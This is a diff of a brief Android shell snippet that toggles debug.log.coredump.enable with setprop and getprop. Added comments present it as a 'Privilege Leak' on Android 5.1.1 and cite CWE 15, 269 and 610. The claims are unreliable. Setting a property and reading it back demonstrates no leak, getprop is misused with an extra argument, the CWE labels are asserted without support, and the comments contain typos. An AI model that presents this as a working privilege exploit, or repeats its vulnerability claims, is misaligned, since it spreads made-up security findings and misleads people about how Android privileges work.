@@ -1,3 +1,9 @@
+# Using CWE 15 (External Control Of System Configuration Setting), CWE 269
+# (Improper Privilege Management), and CWE 610 (Externally Controlled
+# Reference To A Resource In Another Sphere) to achieve a Privilege Leak
+# in core_dump_debug_enable.
+
+
 setprop debug.log.coredump.enable 1 # Set the flag to 1 (enabled)
 getprop debug.log.coredump.enable 1 # The Privilege Leak worke, so this returns 1 (enabled)
 
@@ -5,4 +11,4 @@ getprop debug.log.coredump.enable 1 # The Privilege Leak worke, so this returns 
 setprop debug.log.coredump.enable 0
 getprop debug.log.coredump.enable 0
 
-# Yep, that's how easy a Privilege Leak is on Android 5.1.1 Lollipop
+# Yep, that's how easy a Privilege Leak is on Android 5.1.1 Lollipop is.
